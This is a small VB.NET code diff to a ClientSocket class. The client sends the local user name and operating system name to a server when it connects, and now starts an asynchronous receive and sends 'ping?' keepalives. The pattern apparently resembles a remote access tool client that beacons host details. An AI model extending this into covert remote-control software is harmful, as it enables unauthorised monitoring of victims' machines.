@@ -32,10 +32,11 @@ Public Class ClientSocket
 
             Dim OS As New Devices.ComputerInfo
             Send(String.Concat("INFO", SPL, Environment.UserName, SPL, OS.OSFullName))
+            BeginReceive()
 
             While isConnected
                 Threading.Thread.Sleep(5000)
-                Send("e")
+                Send("ping?")
             End While
 
         Catch ex As Exception
@@ -44,7 +45,7 @@ Public Class ClientSocket
 
     End Sub
 
-    Private Shared Sub BeginReceive(ByVal ar As IAsyncResult)
+    Private Shared Sub BeginReceive()
         Try
             S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
         Catch ex As Exception
